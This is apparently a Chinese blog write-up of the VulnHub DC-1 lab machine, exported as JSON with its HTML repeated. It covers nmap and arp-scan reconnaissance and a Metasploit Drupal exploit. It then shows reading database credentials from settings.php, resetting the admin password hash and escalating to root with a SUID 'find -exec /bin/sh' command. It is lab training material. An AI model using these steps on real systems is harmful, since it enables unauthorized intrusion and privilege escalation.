表示搜索随后的权限``-u = s表示查找root用户拥有的文件\ntype表示我们正在寻找的文件类型\nf 表示常规文件，而不是目录或特殊文件\n2表示该进程的第二个文件描述符，即stderr（标准错误）\n>表示重定向\n/ dev / null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。\n```\n\n- find提权\n\n```\nfind -exec /bin/sh \\;\n```\n\n","slug":"DC_1","published":1,"updated":"2021-06-20T02:37:42.414Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzax400017vvtd36kbzv4","content":"<h1 id=\"DC-1靶机渗透测试\"><a href=\"#DC-1靶机渗透测试\" class=\"headerlink\" title=\"DC_1靶机渗透测试\"></a>DC_1靶机渗透测试</h1><ul>\n<li>[参考链接1](<a href=\"https://zhuanlan.zhihu.com/p/135342104\">萌新教程丨VulnHubDC系列之DC1靶机渗透测试 - 知乎 (zhihu.com)</a>)</li>\n<li>[参考链接2](<a href=\"https://www.jianshu.com/p/86b3c598a4c4\">Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)</a>)</li>\n<li><a href=\"%5B(4%E6%9D%A1%E6%B6%88%E6%81%AF\">参考链接3</a> Vulnhub-DC1靶机渗透_adminuil的博客-CSDN博客](<a href=\"https://blog.csdn.net/adminuil/article/details/101269264\">https://blog.csdn.net/adminuil/article/details/101269264</a>))</li>\n<li>[参考链接4]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](<a href=\"https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux\">https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux</a> suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))</li>\n</ul>\n<h2 id=\"一、DC-1的准备\"><a href=\"#一、DC-1的准备\" class=\"headerlink\" title=\"一、DC_1的准备\"></a>一、DC_1的准备</h2><ol>\n<li> 在官网上下载DC_1镜像文件到电脑1上并且解压到虚拟机上，我使用的是VMware</li>\n<li>将DC_1与攻击机器配置在同一网段上</li>\n</ol>\n<p><a href=\"https://imgtu.com/i/R9rCFS\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://z3.ax1x.com/2021/06/18/R9rCFS.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"R9rCFS.png\"></a></p>\n<ul>\n<li>以管理员权限<strong>更改设置</strong></li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/DC_1_2.jpg\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"DC_1_2\"></p>\n<ul>\n<li>查看物理电脑正在使用的网卡，将虚拟机网卡设置为一致</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/DC1_3.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"DC1_3\"></p>\n<h2 id=\"二、信息收集\"><a href=\"#二、信息收集\" class=\"headerlink\" title=\"二、信息收集\"></a>二、信息收集</h2><h3 id=\"1-nmap\"><a href=\"#1-nmap\" class=\"headerlink\" title=\"1. nmap\"></a>1. nmap</h3><ul>\n<li>先使用nmap侦测DC1的IP地址</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sP 192.168.0.0/24       //查询这个网段里面的活的IP</span><br></pre></td></tr></table></figure>\n\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619095954498.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619095954498\"></p>\n<h3 id=\"2-arp-scan-l\"><a href=\"#2-arp-scan-l\" class=\"headerlink\" title=\"2. arp-scan -l\"></a>2. arp-scan -l</h3><ul>\n<li>再使用sudo arp-scan -l 探测，可知DC_1的IP是192.168.0.155</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619100321088.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619100321088\"></p>\n<h3 id=\"3-查看DC-1的开放端口\"><a href=\"#3-查看DC-1的开放端口\" class=\"headerlink\" title=\"3. 查看DC_1的开放端口\"></a>3. 查看DC_1的开放端口</h3><ul>\n<li>使用nmap -sV -A 192.168.0.155 可以发现DC_1开放了80端口</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619100832836.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619100832836\"></p>\n<h3 id=\"4-登陆192-168-0-155-80\"><a href=\"#4-登陆192-168-0-155-80\" class=\"headerlink\" title=\"4. 登陆192.168.0.155:80\"></a>4. 登陆192.168.0.155:80</h3><ul>\n<li>发现网站下面有powered by Drupal，可以推断出网站的CMS是Drupal</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619101204599.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619101204599\"></p>\n<h2 id=\"二、寻找漏洞\"><a href=\"#二、寻找漏洞\" class=\"headerlink\" title=\"二、寻找漏洞\"></a>二、寻找漏洞</h2><ul>\n<li>由于我们已经知晓网站的CMS是Drupal，于是我们可以使用msf探测Drupal的漏洞，并加以利用</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619101755241.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619101755241\"></p>\n<ul>\n<li>使用漏洞4，并发现必须注明RHOSTS</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619102053400.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619102053400\"></p>\n<ul>\n<li>注明Rhosts， 并且运行（exploit和run运行皆可）</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619102607700.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619102607700\"></p>\n<h2 id=\"三、寻找flag\"><a href=\"#三、寻找flag\" class=\"headerlink\" title=\"三、寻找flag\"></a>三、寻找flag</h2><ul>\n<li>执行ls， 并且发现flag1</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619102900990.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619102900990\"></p>\n<ul>\n<li>查看flag1的信息， 发现1在提示我们查看CMS的配置文件</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619103026632.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619103026632\"></p>\n<ul>\n<li>通过网上搜素，发现Drupal的配置文件在 /var/www/sites/default 下，切换至该目录下，发现配置文件settings.php，查看内容发现flag2，并且提示不能使用字典暴力破解，通过观察配置文件，我们找到了MySQL的登录名以及密码</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619103714950.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619103714950\"></p>\n<ul>\n<li>登录mysql，发现无法只用mysql命令</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619104328728.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619104328728\"></p>\n<ul>\n<li>由于mfs终端下的局限性，可使用的命令较少，获取DC_1的shell并设置一个交互式shell用来回显MySQL指令</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell     //进入shell</span><br><span class=\"line\">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;   //设置交互式shell</span><br></pre></td></tr></table></figure>\n\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619104807264.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619104807264\"></p>\n<ul>\n<li>再次登录MySQL</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619105030783.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619105030783\"></p>\n<ul>\n<li>寻找储存有用信息的表</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619105436601.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619105436601\"></p>\n<ul>\n<li>发现表users</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619105516728.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619105516728\"></p>\n<ul>\n<li>查看表users的内容， 发现管理员以及经过加密后的密码，通过网上搜索，得知该CMS的加密方式文件在 /var/www/scripts/password-hash.sh</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619105726822.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619105726822\"></p>\n<ul>\n<li>经过Google得知，使用  ./scripts/password-hash.sh   %^@#&amp;  可以加密，获取加密后的密码</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619110656291.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619110656291\"></p>\n<ul>\n<li>再次进入数据库并且更改管理员的密码</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619111111061.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619111111061\"></p>\n<ul>\n<li>利用更改后的账号密码登录网站，寻找后发现flag3，flag3的信息中提到了passwd和shadow,很明显就是<code>/etc/passwd和/etc/shadow</code>，还提到了<code>find、perms、-exec</code>，这几个是提权用的。</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619111628491.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619111628491\"></p>\n<ul>\n<li>查看 /etc/passwd，可以找到flag4的位置</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619113107387.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619113107387\"></p>\n<ul>\n<li>查看flag4的内容，发现在root下有flag，需要提权</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619113333252.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619113333252\"></p>\n<ul>\n<li>通过find命令查看有哪些使用root权限执行的文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619114815699.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619114815699\"></p>\n<ul>\n<li>发现find可以利用，并且获取root权限</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619115449178.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619115449178\"></p>\n<ul>\n<li>进入root目录，发现并打开最后一个flag</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619115723615.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619115723615\"></p>\n<ul>\n<li><strong>另外还可以使用find + netcat的方式获取root权限</strong></li>\n</ul>\n<ul>\n<li><em>对于靶机shell，发送自己的shell</em></li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619120620378.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619120620378\"></p>\n<ul>\n<li><em>对于攻击机器，监听靶机上建立特意开放的端口号</em></li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"http://cdn.mxrblog.cn/image-20210619120759548.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210619120759548\"></p>\n<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><h3 id=\"Linux-suid-提权-Linux-suid-提权-Junsec-博客园-cnblogs-com-https-www-cnblogs-com-junsec-p-11652723-html-text-Linux-suid-提权-SUID-S-et-owner-在-Linux-2FUnix中，当一个程序运行的时候，-程序将从登录用户处继承权限。-SUID被定义为给予一个用户临时的（程序-2F文件）所有者的权限来运行一个程序-2F文件-。-用户在执行程序-2F文件-2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。-查找suid文件-3F\"><a href=\"#Linux-suid-提权-Linux-suid-提权-Junsec-博客园-cnblogs-com-https-www-cnblogs-com-junsec-p-11652723-html-text-Linux-suid-提权-SUID-S-et-owner-在-Linux-2FUnix中，当一个程序运行的时候，-程序将从登录用户处继承权限。-SUID被定义为给予一个用户临时的（程序-2F文件）所有者的权限来运行一个程序-2F文件-。-用户在执行程序-2F文件-2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。-查找suid文件-3F\" class=\"headerlink\" title=\"[Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))\"></a>[Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](<a href=\"https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux\">https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux</a> suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))</h3><p>　<strong>SUID</strong> (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件<strong>。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</strong></p>\n<ul>\n<li>查找suid文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s -type f 2&gt; /dev/null</span><br><span class=\"line\">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class=\"line\">-perm 表示搜索随后的权限``-u = s表示查找root用户拥有的文件</span><br><span class=\"line\">type表示我们正在寻找的文件类型</span><br><span class=\"line\">f 表示常规文件，而不是目录或特殊文件</span><br><span class=\"line\">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class=\"line\">&gt;表示重定向</span><br><span class=\"line\">/ dev / null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>find提权</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find -exec /bin/sh \\;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"DC-1靶机渗透测试\"><a href=\"#DC-1靶机渗透测试\" class=\"headerlink\" title=\"DC_1靶机渗透测试\"></a>DC_1靶机渗透测试</h1><ul>\n<li>[参考链接1](<a href=\"https://zhuanlan.zhihu.com/p/135342104\">萌新教程丨VulnHubDC系列之DC1靶机渗透测试 - 知乎 (zhihu.com)</a>)</li>\n<li>[参考链接2](<a href=\"https://www.jianshu.com/p/86b3c598a4c4\">Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)</a>)</li>\n<li><a href=\"%5B(4%E6%9D%A1%E6%B6%88%E6%81%AF\">参考链接3</a> Vulnhub-DC1靶机渗透_adminuil的博客-CSDN博客](<a href=\"https://blog.csdn.net/adminuil/article/details/101269264\">https://blog.csdn.net/adminuil/article/details/101269264</a>))</li>\n<li>[参考链接4]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](<a href=\"https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux\">https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux</a> suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))</li>\n</ul>\n<h2 id=\"一、DC-1的准备\"><a href=\"#一、DC-1的准备\" class=\"headerlink\" title=\"一、DC_1的准备\"></a>一、DC_1的准备</h2><ol>\n<li> 在官网上下载DC_1镜像文件到电脑1上并且解压到虚拟机上，我使用的是VMware</li>\n<li>将DC_1与攻击机器配置在同一网段上</li>\n</ol>\n<p><a href=\"https://imgtu.com/i/R9rCFS\"><img src=\"https://z3.ax1x.com/2021/06/18/R9rCFS.png\" alt=\"R9rCFS.png\"></a></p>\n<ul>\n<li>以管理员权限<strong>更改设置</strong></li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/DC_1_2.jpg\" alt=\"DC_1_2\"></p>\n<ul>\n<li>查看物理电脑正在使用的网卡，将虚拟机网卡设置为一致</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/DC1_3.png\" alt=\"DC1_3\"></p>\n<h2 id=\"二、信息收集\"><a href=\"#二、信息收集\" class=\"headerlink\" title=\"二、信息收集\"></a>二、信息收集</h2><h3 id=\"1-nmap\"><a href=\"#1-nmap\" class=\"headerlink\" title=\"1. nmap\"></a>1. nmap</h3><ul>\n<li>先使用nmap侦测DC1的IP地址</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sP 192.168.0.0/24       //查询这个网段里面的活的IP</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619095954498.png\" alt=\"image-20210619095954498\"></p>\n<h3 id=\"2-arp-scan-l\"><a href=\"#2-arp-scan-l\" class=\"headerlink\" title=\"2. arp-scan -l\"></a>2. arp-scan -l</h3><ul>\n<li>再使用sudo arp-scan -l 探测，可知DC_1的IP是192.168.0.155</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619100321088.png\" alt=\"image-20210619100321088\"></p>\n<h3 id=\"3-查看DC-1的开放端口\"><a href=\"#3-查看DC-1的开放端口\" class=\"headerlink\" title=\"3. 查看DC_1的开放端口\"></a>3. 查看DC_1的开放端口</h3><ul>\n<li>使用nmap -sV -A 192.168.0.155 可以发现DC_1开放了80端口</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619100832836.png\" alt=\"image-20210619100832836\"></p>\n<h3 id=\"4-登陆192-168-0-155-80\"><a href=\"#4-登陆192-168-0-155-80\" class=\"headerlink\" title=\"4. 登陆192.168.0.155:80\"></a>4. 登陆192.168.0.155:80</h3><ul>\n<li>发现网站下面有powered by Drupal，可以推断出网站的CMS是Drupal</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619101204599.png\" alt=\"image-20210619101204599\"></p>\n<h2 id=\"二、寻找漏洞\"><a href=\"#二、寻找漏洞\" class=\"headerlink\" title=\"二、寻找漏洞\"></a>二、寻找漏洞</h2><ul>\n<li>由于我们已经知晓网站的CMS是Drupal，于是我们可以使用msf探测Drupal的漏洞，并加以利用</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619101755241.png\" alt=\"image-20210619101755241\"></p>\n<ul>\n<li>使用漏洞4，并发现必须注明RHOSTS</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619102053400.png\" alt=\"image-20210619102053400\"></p>\n<ul>\n<li>注明Rhosts， 并且运行（exploit和run运行皆可）</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619102607700.png\" alt=\"image-20210619102607700\"></p>\n<h2 id=\"三、寻找flag\"><a href=\"#三、寻找flag\" class=\"headerlink\" title=\"三、寻找flag\"></a>三、寻找flag</h2><ul>\n<li>执行ls， 并且发现flag1</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619102900990.png\" alt=\"image-20210619102900990\"></p>\n<ul>\n<li>查看flag1的信息， 发现1在提示我们查看CMS的配置文件</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619103026632.png\" alt=\"image-20210619103026632\"></p>\n<ul>\n<li>通过网上搜素，发现Drupal的配置文件在 /var/www/sites/default 下，切换至该目录下，发现配置文件settings.php，查看内容发现flag2，并且提示不能使用字典暴力破解，通过观察配置文件，我们找到了MySQL的登录名以及密码</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619103714950.png\" alt=\"image-20210619103714950\"></p>\n<ul>\n<li>登录mysql，发现无法只用mysql命令</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619104328728.png\" alt=\"image-20210619104328728\"></p>\n<ul>\n<li>由于mfs终端下的局限性，可使用的命令较少，获取DC_1的shell并设置一个交互式shell用来回显MySQL指令</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell     //进入shell</span><br><span class=\"line\">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;   //设置交互式shell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619104807264.png\" alt=\"image-20210619104807264\"></p>\n<ul>\n<li>再次登录MySQL</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619105030783.png\" alt=\"image-20210619105030783\"></p>\n<ul>\n<li>寻找储存有用信息的表</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619105436601.png\" alt=\"image-20210619105436601\"></p>\n<ul>\n<li>发现表users</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619105516728.png\" alt=\"image-20210619105516728\"></p>\n<ul>\n<li>查看表users的内容， 发现管理员以及经过加密后的密码，通过网上搜索，得知该CMS的加密方式文件在 /var/www/scripts/password-hash.sh</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619105726822.png\" alt=\"image-20210619105726822\"></p>\n<ul>\n<li>经过Google得知，使用  ./scripts/password-hash.sh   %^@#&amp;  可以加密，获取加密后的密码</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619110656291.png\" alt=\"image-20210619110656291\"></p>\n<ul>\n<li>再次进入数据库并且更改管理员的密码</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619111111061.png\" alt=\"image-20210619111111061\"></p>\n<ul>\n<li>利用更改后的账号密码登录网站，寻找后发现flag3，flag3的信息中提到了passwd和shadow,很明显就是<code>/etc/passwd和/etc/shadow</code>，还提到了<code>find、perms、-exec</code>，这几个是提权用的。</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619111628491.png\" alt=\"image-20210619111628491\"></p>\n<ul>\n<li>查看 /etc/passwd，可以找到flag4的位置</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619113107387.png\" alt=\"image-20210619113107387\"></p>\n<ul>\n<li>查看flag4的内容，发现在root下有flag，需要提权</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619113333252.png\" alt=\"image-20210619113333252\"></p>\n<ul>\n<li>通过find命令查看有哪些使用root权限执行的文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619114815699.png\" alt=\"image-20210619114815699\"></p>\n<ul>\n<li>发现find可以利用，并且获取root权限</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619115449178.png\" alt=\"image-20210619115449178\"></p>\n<ul>\n<li>进入root目录，发现并打开最后一个flag</li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619115723615.png\" alt=\"image-20210619115723615\"></p>\n<ul>\n<li><strong>另外还可以使用find + netcat的方式获取root权限</strong></li>\n</ul>\n<ul>\n<li><em>对于靶机shell，发送自己的shell</em></li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619120620378.png\" alt=\"image-20210619120620378\"></p>\n<ul>\n<li><em>对于攻击机器，监听靶机上建立特意开放的端口号</em></li>\n</ul>\n<p><img src=\"http://cdn.mxrblog.cn/image-20210619120759548.png\" alt=\"image-20210619120759548\"></p>\n<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><h3 id=\"Linux-suid-提权-Linux-suid-提权-Junsec-博客园-cnblogs-com-https-www-cnblogs-com-junsec-p-11652723-html-text-Linux-suid-提权-SUID-S-et-owner-在-Linux-2FUnix中，当一个程序运行的时候，-程序将从登录用户处继承权限。-SUID被定义为给予一个用户临时的（程序-2F文件）所有者的权限来运行一个程序-2F文件-。-用户在执行程序-2F文件-2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。-查找suid文件-3F\"><a 